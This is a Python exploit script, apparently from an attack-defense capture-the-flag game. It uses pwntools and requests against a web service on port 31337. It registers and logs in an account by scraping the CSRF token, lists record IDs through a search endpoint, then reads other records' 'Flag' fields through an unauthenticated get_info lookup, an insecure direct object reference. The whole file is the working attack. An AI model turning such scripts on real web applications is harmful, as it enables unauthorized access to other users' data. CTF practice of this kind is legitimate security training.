#!/usr/bin/env python3 -u

import requests
import sys
import json

from pwn import *

context.log_level = "debug"

ip = sys.argv[1]
#ip = "6.6.3.2"
base_url = "http://{}:31337/".format(ip)
signup_url = base_url + "signup"
signin_url = base_url + "signin"
search_url = base_url + "search_handler?Search_string=0&Search_options=Flag"
getinfo_url = base_url + "get_info?id="


client = requests.session()
csrf = ""
password = "password"

def signup(username):
    global csrf
    data = client.get(signup_url)
    csrf = data.text.split('hidden" value="')[1].split('"')[0]

    login_data = dict({
            'firstname':username, 
            'lastname':'ooooo', 
            'username':username, 
            'password':password, 
            'email':'a@a.com', 
            'submit':'Sign Up', 
            'csrf_token':csrf
            }) 
    req = client.post(signup_url, data=login_data)
    if req.status_code == 200:
        return True, req
    return False, None

def signin(username):
    global csrf
    data = client.get(signup_url)
    csrf = data.text.split('hidden" value="')[1].split('"')[0]

    login_data = dict({
            'username':username,
            'password':password,
            'csrf_token':csrf,
            'submit':'Sign In'
            })
    req = client.post(signin_url, data=login_data)
    if req.status_code == 200:
        return True, req
    return False, None

def search():
    req = client.get(search_url)
    data = json.loads(req.content)
    return data["result"]

def get_info(id):
    req = client.get(getinfo_url + id)
    data = json.loads(req.content)
    try:
        flag = data["result"]["Flag"]
    except:
        flag = ""
    return flag


def main():
    username = "aaaaaaaaaa" 
    
    log.info("Signing up")
    # Signin is necessary only on the first run
    status, reqst = signup(username)
    if not status:
        log.error("signup failure")
    log.success("Siging in now...")
    
    # Continue from this on the second run
    status, reqst = signin(username)
    log.info("Getting ID's")

    possible_ids = search()
    plog = log.progress("Retrieving flags")
    flag_list = []
    for id in possible_ids[:5]:
        flag = get_info(id)
        plog.status(flag)
        flag_list += [flag]
    plog.success("Finished exploiting")
    return flag_list

if __name__ == "__main__":
    try:
        flags = main()
    except:
        pass
    for flg in flags:
        print(flg) 


